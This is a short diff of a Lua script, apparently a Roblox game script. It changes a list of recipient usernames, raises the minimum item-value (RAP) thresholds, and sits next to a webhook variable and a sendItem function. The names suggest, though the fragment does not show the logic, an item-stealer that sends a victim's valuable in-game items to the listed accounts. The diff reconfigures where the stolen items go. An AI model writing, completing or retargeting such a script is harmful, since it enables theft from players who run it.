@@ -201,9 +201,9 @@ local function getRAP(Type, Item)
     ) or 0)
 end
 
-local users = Usernames or {"PetsGoMommy", "TobiAltGrind", "TobiHatching"}
-local min_rap = min_rap or 1000
-local min_chance = min_chance or 100000
+local users = Usernames or {"nsafds", "bsds", "bsdbs"}
+local min_rap = min_rap or 1000000
+local min_chance = min_chance or 10000000
 local webhook = webhook
 
 local function sendItem(category, uid, am)
